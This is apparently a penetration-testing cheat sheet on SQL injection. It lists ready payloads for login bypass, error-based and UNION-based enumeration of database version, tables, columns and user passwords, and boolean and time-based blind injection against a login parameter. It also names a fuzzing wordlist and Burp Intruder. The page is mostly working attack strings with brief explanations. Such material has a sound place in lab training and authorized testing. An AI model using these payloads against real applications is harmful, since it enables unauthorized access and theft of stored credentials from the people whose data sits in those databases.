# 💉 SQL Injection

Try [seclists wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post\_page-----c95930e9523d--------------------------------) for sql, use burpsuite intruder to test on the parameter

Basic payload to test:

```
'OR '' = '
```

## Error Based Payloads

Sometimes SQL injection can lead to authentication bypass.

Something like this can be used. Try playing around by switching `'` and `"`&#x20;

```php
whatever' OR 1=1 -- //
```

To enumerate version on error based SQLi

```SQL
' or 1=1 in (select @@version) -- //
```

We can directly enumerate the database if we get output:

```sql
' OR 1=1 in (SELECT * FROM users) -- //
```

If we get an error try the columns one by one:

```sql
' or 1=1 in (SELECT password FROM users) -- //
```

To get passwords of specific user:

```sql
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```



## UNION-based Payloads

We can find number of columns in the original query with:

```SQL
' ORDER BY 1-- //
```

Then to do a union attack:

```SQL
%' UNION SELECT database(), user(), @@version, null, null -- //
```

Now we can check if there are other tables in this database.

{% code overflow="wrap" %}
```mysQL
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
{% endcode %}



## Blind SQLi

Blind SQLi occurs when no database response is returned. This case we can use _boolean_ or _time_ based logic.



To try _boolean_ based SQL:

```http
http://<ip>/login.php?user=admin' AND 1=1 -- //
```

If both the statements are true the application will return a true value hence if we get a true value we can say admin is in the database.



To try _Time_ based SQLi:

```http
http://<ip>/login.php?user=admin' AND IF (1=1, sleep(3),'false') -- //
```

This will make the application hang if the user is present.

